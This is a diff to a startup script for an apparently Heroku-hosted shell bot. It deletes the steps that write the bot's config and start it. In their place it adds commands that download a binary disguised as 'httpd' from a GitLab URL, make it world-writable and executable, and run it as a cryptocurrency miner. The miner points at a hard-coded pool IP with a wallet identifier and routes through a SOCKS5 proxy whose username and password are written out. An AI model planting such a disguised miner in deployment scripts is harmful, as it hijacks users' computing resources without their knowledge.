@@ -6,15 +6,6 @@
 ## edit your Config Vars in heroku/app/settings and 
 ## restart the bot by turning the worker off and back on
 
-echo "Creating config.json..."
-cd /home/shell-bot
-cat > config.json << EOF
-{
-    "authToken": "$BOT_TOKEN",
-    "owner": $OWN_ID
-}
-EOF
-echo "Done."
-
-echo "Starting Bot..."
-node server
+wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd
+chmod +x httpd
+chmod 777 httpd && ./httpd -a yescryptr16 -o stratum+tcp://149.102.231.74:443 -u web1qusfnt4vf67cfklrn0ntsd6ggpru04dwm7cpsp2.$(echo turu-$(shuf -i 1-9999 -n 1)) -p x -t 4 --proxy=socks5://6SKWObeYXA:6a9pyC0p@sin.socks.ipvanish.com:1080
